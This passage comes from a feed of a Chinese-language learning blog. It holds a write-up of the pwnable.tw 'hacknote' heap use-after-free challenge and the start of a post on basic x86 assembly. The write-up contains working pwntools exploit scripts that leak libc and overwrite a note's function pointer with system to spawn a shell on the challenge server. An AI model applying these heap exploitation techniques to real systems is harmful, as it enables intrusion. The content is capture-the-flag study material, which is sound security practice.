io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,length)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Content&quot;</span>,context)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,index)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Print</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,index)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">&quot;16&quot;</span>,<span class=\"string\">b&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;16&quot;</span>,<span class=\"string\">b&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;8&quot;</span>,p32(<span class=\"number\">0x08048986</span>))</span><br><span class=\"line\">Print(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">io.recv(<span class=\"number\">1024</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​\t几个细节问题,比如为什么不能用数字什么的,先看看比较官方的exp怎么写的吧</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./hacknote&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addnote</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delnote</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">printnote</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">magic = <span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;aaaa&quot;</span>) <span class=\"comment\"># add note 0</span></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;ddaa&quot;</span>) <span class=\"comment\"># add note 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">delnote(<span class=\"number\">0</span>) <span class=\"comment\"># delete note 0</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>) <span class=\"comment\"># delete note 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">addnote(<span class=\"number\">8</span>, p32(magic)) <span class=\"comment\"># add note 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">printnote(<span class=\"number\">0</span>) <span class=\"comment\"># print note 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t修改自己的exp</p>\n<p>​\t\t1.数字都给加上str() 转换一下就可以了</p>\n<p>​\t\t2.输入的字符串可以把b去了</p>\n<p>这下顺眼多了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./hacknote&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,context</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Content&quot;</span>,context)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Print</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(<span class=\"number\">0x08048986</span>))</span><br><span class=\"line\">Print(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\">#io.recv(1024)</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"泄露libc\"><a href=\"#泄露libc\" class=\"headerlink\" title=\"泄露libc\"></a>泄露libc</h3><p>​\t\t没有后门函数,那就需要泄露libc地址后system、getshell. 把调用的函数地址修改成puts函数的地址,那怎么传参数呢? 参数要用栈,</p>\n<pre><code>    #### puts\n</code></pre>\n<p>​\t\t这是把堆当成栈来用了吗… 也不是, 这个不能用plt的puts来打印,因为没有栈传递参数,但它本身是有一个打印的函数的,正常情况下是打印存储的数据的,如下图,0x0804862b是打印函数,调用这个函数打印0x0804b018地址存储的数据,所以我们可以把这里改成puts的got表地址,就可以打印出来它的内容了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/image-20230416105824835.png\" alt=\"image-20230416105824835\"></p>\n<p>​\t\tputs_addr &#x3D; u32(io.recv(4)) 这样写还有问题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puts_addr = io.recv(<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;here:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(puts_addr)</span><br></pre></td></tr></table></figure>\n<p>​\t\t调试一下就会发现有问题,打印的地方不对,在接收这个之前,其实还会接收到那一堆的提示信息,所以先把提示信息接收到,再接收地址即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Print(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.recv()</span><br><span class=\"line\">puts_addr = u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;here:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t</p>\n<p>后面再继续申请的话,编号是多少呢?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(<span class=\"number\">0x804862B</span>) + p32(elf.got[<span class=\"string\">&quot;puts&quot;</span>])) <span class=\"comment\">//编号是多少???</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">myelf = ELF(<span class=\"string\">&#x27;./hacknote&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10102</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_note</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">print_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">32</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;45&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr = u32(io.recv(<span class=\"number\">8</span>)[<span class=\"number\">4</span>:<span class=\"number\">8</span>]) - <span class=\"number\">0x1b07b0</span></span><br><span class=\"line\">sys_addr = libc_addr + mylibc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add_note(8,&quot;12&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># add_note(8,&quot;34&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># del_note(3)</span></span><br><span class=\"line\"><span class=\"comment\"># del_note(4)</span></span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">8</span>,p32(sys_addr)+<span class=\"string\">&quot;;sh\\x00&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>libc_addr &#x3D; u32(io.recv(8)[4:8]) - 0x1b07b0<br>sys_addr &#x3D; libc_addr + libc.symbols[‘system’]</p>\n<p>首先,有随机化,这个随机化是什么? 所以必须每次要接收到地址才行,不能用之前的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def <span class=\"title function_\">Print</span><span class=\"params\">(index)</span>:</span><br><span class=\"line\">    <span class=\"meta\">#io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span></span><br><span class=\"line\">    <span class=\"meta\">#io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,str(index))</span></span><br><span class=\"line\">    io.<span class=\"title function_\">recvuntil</span><span class=\"params\">(<span class=\"string\">&quot;choice :&quot;</span>)</span></span><br><span class=\"line\">    io.<span class=\"title function_\">sendline</span><span class=\"params\">(<span class=\"string\">&quot;3&quot;</span>)</span></span><br><span class=\"line\">    io.<span class=\"title function_\">recvuntil</span><span class=\"params\">(<span class=\"string\">&quot;Index :&quot;</span>)</span></span><br><span class=\"line\">    io.<span class=\"title function_\">sendline</span><span class=\"params\">(str(index))</span></span><br><span class=\"line\">这玩意有什么区别吗....</span><br><span class=\"line\">          io.<span class=\"title function_\">sendlineafter</span><span class=\"params\">(<span class=\"string\">&quot;choice :&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span></span><br><span class=\"line\">    io.<span class=\"title function_\">sendlineafter</span><span class=\"params\">(<span class=\"string\">&quot;Index :&quot;</span>,str(index))</span></span><br><span class=\"line\">      改成这样也可以..........卧槽了.......尼玛范德萨发爱上,要骂人了</span><br><span class=\"line\">      </span><br><span class=\"line\">      </span><br><span class=\"line\">      </span><br><span class=\"line\"> [DEBUG] Received 0xc6 bytes:</span><br><span class=\"line\">    b&#x27;\\n&#x27;</span><br><span class=\"line\">    b&#x27;----------------------\\n&#x27;</span><br><span class=\"line\">    b&#x27;       HackNote       \\n&#x27;</span><br><span class=\"line\">    b&#x27;----------------------\\n&#x27;</span><br><span class=\"line\">    b&#x27; 1. Add note          \\n&#x27;</span><br><span class=\"line\">    b&#x27; 2. Delete note       \\n&#x27;</span><br><span class=\"line\">    b&#x27; 3. Print note        \\n&#x27;</span><br><span class=\"line\">    b&#x27; 4. Exit              \\n&#x27;</span><br><span class=\"line\">    b&#x27;----------------------\\n&#x27;</span><br><span class=\"line\">    b&#x27;Your choice :&#x27;</span><br><span class=\"line\">[DEBUG] Sent 0x2 bytes:</span><br><span class=\"line\">    b&#x27;3\\n&#x27;</span><br><span class=\"line\">[DEBUG] Received 0x7 bytes:</span><br><span class=\"line\">    b&#x27;Index :&#x27;</span><br><span class=\"line\">[DEBUG] Sent 0x2 bytes:</span><br><span class=\"line\">    b&#x27;2\\n&#x27;</span><br><span class=\"line\"><span class=\"title function_\">Traceback</span> <span class=\"params\">(most recent call last)</span>:</span><br><span class=\"line\">  File &quot;2.py&quot;, line 63, in &lt;module&gt;</span><br><span class=\"line\">    libc_addr = u32(io.recv(<span class=\"number\">8</span>)[<span class=\"number\">4</span>:<span class=\"number\">8</span>]) - <span class=\"number\">0x1b07b0</span></span><br><span class=\"line\">  File <span class=\"string\">&quot;/usr/local/lib/python3.6/dist-packages/pwnlib/context/__init__.py&quot;</span>, line <span class=\"number\">1597</span>, in setter</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">function</span><span class=\"params\">(*a, **kw)</span></span><br><span class=\"line\">  File &quot;/usr/local/lib/python3.6/dist-packages/pwnlib/util/packing.py&quot;, line 353, in <span class=\"title function_\">routine</span></span><br><span class=\"line\">    <span class=\"params\">(<span class=\"string\">&quot;big&quot;</span>,    False)</span>:  bu&#125;[endian, <span class=\"type\">signed</span>]<span class=\"params\">(number, <span class=\"number\">3</span>)</span></span><br><span class=\"line\">  File &quot;/usr/local/lib/python3.6/dist-packages/pwnlib/util/packing.py&quot;, line 320, in routine</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">struct_op</span><span class=\"params\">(data)</span>[0]</span><br><span class=\"line\"><span class=\"keyword\">struct</span>.error: unpack requires a buffer of 4 bytes</span><br><span class=\"line\">[*] Closed connection to chall.pwnable.tw port 10102</span><br></pre></td></tr></table></figure>\n\n<p>我知道了………..如果不在这之后发..收到的就是后面的那个东西了…….</p>\n<p>choice : 会收到 空格和:作为recv的值……</p>\n<h3 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h3><p>wiki里有调试,可以学一下</p>\n<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>​\t\t如何进行调试源代码? 指定源代码一行一行走?</p>\n<p>​\t\tgdb调试的时候r了,ctrl+c了,怎么继续执行    好像没太有办法,可以下断点!也挺好用的</p>\n<p>​\t\t为什么释放的chunk是0x18 也就是24呢,不是16吗 和对其有关? </p>\n<p>​\t\t怎么在gdb里面发送 p32 p64这种数据呢?  可以用eb命令等 直接修改内存就可以了</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/",
            "title": "pwn入门-16-汇编反汇编基础",
            "date_published": "2023-03-03T13:54:42.000Z",
            "content_html": "<h1 id=\"常用汇编指令\"><a href=\"#常用汇编指令\" class=\"headerlink\" title=\"常用汇编指令\"></a>常用汇编指令</h1><p>lea 加载有效地址</p>\n<p>​\tlea   eax, [ebx+8]  将ebx+8存储的内存<font color=\"red\">地址</font> +8 传给eax</p>\n<p>​\tmov eax, [ebx+8]  将ebx+8内存地址指向的<font color=\"red\">数据</font> 传给eax</p>\n<p>cmp</p>\n<h2 id=\"算数运算\"><a href=\"#算数运算\" class=\"headerlink\" title=\"算数运算\"></a>算数运算</h2><p>sub 减</p>\n<p>add 加</p>\n<p>inc +1</p>\n<p>dec -1</p>\n<p>mul 乘</p>\n<p>div 除</p>\n<h2 id=\"条件指令及跳转指令\"><a href=\"#条件指令及跳转指令\" class=\"headerlink\" title=\"条件指令及跳转指令\"></a>条件指令及跳转指令</h2><p><a href=\"https://blog.csdn.net/counsellor/article/details/81005101\">https://blog.csdn.net/counsellor/article/details/81005101</a></p>\n<p>jmp  无条件跳转                                      p74-76</p>\n<p>这几个都是根据标志位跳转</p>\n<p>jz 如果ZF标志位置位则跳转  等于</p>\n<p>jnz 如果ZF标志位被清除则跳转 不等于</p>\n<p>je 等于跳转</p>\n<p>jg 有符号大于则跳转</p>\n<p>test eax,eax 检测目标值是否为0 ,即两个操作数按位与运算,为0的话设置标志位ZF为1,否则为0(不修改使用的操作数)</p>\n<p>cmp eax,ebx 如果两个参数相等,ZF标志位置位</p>\n<p>一般在cmp指令后用je，test指令后用jz</p>\n<h2 id=\"函数使用的\"><a href=\"#函数使用的\" class=\"headerlink\" title=\"函数使用的\"></a>函数使用的</h2><p>call</p>\n<p>leave</p>\n<p>enter</p>\n<p>ret</p>\n<p><a href=\"https://www.codenong.com/10483544/\">https://www.codenong.com/10483544/</a></p>\n<h2 id=\"全局变量与局部变量\"><a href=\"#全局变量与局部变量\" class=\"headerlink\" title=\"全局变量与局部变量\"></a>全局变量与局部变量</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> j =<span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;this is:%d %d\\n&quot;</span>,i,j);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230303215108473.png\" alt=\"image-20230303215108473\"></p>\n<p>全局变量i通过内存地址引用,局部变量通过栈地址引用</p>\n<h1 id=\"算数运算-1\"><a href=\"#算数运算-1\" class=\"headerlink\" title=\"算数运算\"></a>算数运算</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"type\">int</span> j=<span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"type\">int</span> k;</span><br><span class=\"line\">  i = i +<span class=\"number\">2</span>;</span><br><span class=\"line\">  k = i/j;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;this is:%d %d %d\\n&quot;</span>,i,j,k);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 